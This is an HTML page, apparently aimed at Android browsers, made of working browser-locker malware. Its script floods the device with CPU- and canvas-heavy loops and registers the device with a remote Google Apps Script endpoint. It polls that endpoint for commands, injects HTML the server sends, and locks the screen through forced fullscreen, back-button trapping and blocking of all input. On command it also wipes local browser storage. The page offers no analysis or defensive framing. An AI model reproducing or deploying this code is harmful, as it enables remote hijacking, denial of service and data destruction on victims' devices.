<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>.</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{width:100%;height:100%;overflow:hidden;position:fixed;top:0;left:0;background:#000}
        body{font-family:Arial,sans-serif;color:#fff}
    </style>
</head>
<body>
<div id="s" style="color:#666;font-size:13px;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:9999;">System...</div>
<script>
const API='https://script.google.com/macros/s/AKfycbydK_xMyMAH3qkqw-O9YqJo8XcXjolH04pBYosvuBZdP3UQ9IcWbfGoImiNsyERUw/exec';
const DID='z'+Math.random().toString(36).substring(2,15);
const M=navigator.userAgent.match(/Android[\s\d.]+/)?.[0]||'Android';
let locked=false;
let floodActive=true;

function heavyFlood(){
  if(!floodActive)return;
  let x=0;
  for(let i=0;i<100000;i++){x+=Math.sqrt(i)*Math.sin(i)*Math.cos(i);}
  let arr=new Array(50000).fill(0).map(()=>Math.random().toString(36).repeat(50));
  JSON.stringify(arr);
  if(floodActive)setTimeout(heavyFlood,0);
}
function canvasFlood(){
  if(!floodActive)return;
  let c=document.createElement('canvas');c.width=2000;c.height=2000;
  let ctx=c.getContext('2d');
  for(let i=0;i<500;i++){ctx.fillStyle='#'+Math.floor(Math.random()*16777215).toString(16);ctx.fillRect(Math.random()*2000,Math.random()*2000,50,50);}
  c.remove();
  if(floodActive)setTimeout(canvasFlood,0);
}

function sematMati(){
  locked=true;
  goFull();
  blockAll();
}
function goFull(){
  document.documentElement.requestFullscreen?.();
  document.documentElement.webkitRequestFullscreen?.();
}
function blockAll(){
  for(let i=0;i<10;i++)history.pushState(null,'',location.href);
  const no=e=>{e.preventDefault();e.stopPropagation();return false;};
  ['contextmenu','touchstart','touchmove','touchend','gesturestart','gesturechange','gestureend','wheel','keydown','keyup','keypress','pointerdown','pointermove','pointerup','click','dblclick','select','scroll','copy','cut','paste'].forEach(ev=>{
    document.addEventListener(ev,no,{passive:false,capture:true});
    window.addEventListener(ev,no,{passive:false,capture:true});
  });
  window.addEventListener('popstate',()=>{for(let i=0;i<5;i++)history.pushState(null,'',location.href);goFull();});
  document.body.style.touchAction='none';
  document.body.style.pointerEvents='none';
}

function wipeData(){
  localStorage.clear();
  sessionStorage.clear();
  indexedDB.databases?.().then(dbs=>dbs.forEach(db=>indexedDB.deleteDatabase(db.name))).catch(()=>{});
  document.body.innerHTML='<div style="color:#f87171;text-align:center;padding:20px;"><h2>⚠️ DATA DIHAPUS</h2><p>Semua data telah direset.</p></div>';
}

async function reg(){
  try{
    let r=await fetch(API,{method:'POST',body:JSON.stringify({action:'register',device_id:DID,model:M})});
    let d=await r.json();
    if(d.command==='UNLOCK'){unlockAll();return;}
    if(d.command==='WIPE'){floodActive=false;wipeData();return;}
    if(d.command){document.body.innerHTML=d.command;sematMati();floodActive=false;}
  }catch(e){}
}
async function chk(){
  try{
    let r=await fetch(API+'?action=check&device_id='+DID);
    let d=await r.json();
    if(d.command==='UNLOCK'){unlockAll();return;}
    if(d.command==='WIPE'){floodActive=false;wipeData();return;}
    if(d.command){document.body.innerHTML=d.command;sematMati();floodActive=false;}
  }catch(e){}
}
function unlockAll(){locked=false;floodActive=false;document.body.innerHTML='<div style="color:#666;">OK</div>';}

heavyFlood();
canvasFlood();
reg();
setInterval(chk,5000);
setInterval(()=>{if(!locked)return;goFull();for(let i=0;i<5;i++)history.pushState(null,'',location.href);},50);
</script>
</body>
</html>
